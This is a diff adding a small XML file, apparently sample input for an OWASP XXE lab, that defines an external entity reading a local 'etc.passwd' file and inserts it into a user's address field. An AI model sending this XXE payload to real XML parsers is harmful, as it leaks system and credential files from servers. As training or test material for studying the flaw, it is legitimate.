@@ -1,0 +1,10 @@
+<?xml version="1.0" encoding="utf-8" ?>
+<!DOCTYPE users [
+<!ENTITY pass SYSTEM "file:///C:/webapps/OWASP_new/a04/etc.passwd">
+]>
+<users>
+	<user>
+	  <name>山田太郎</name>
+	  <address>&pass;</address>
+	</user>
+</users>
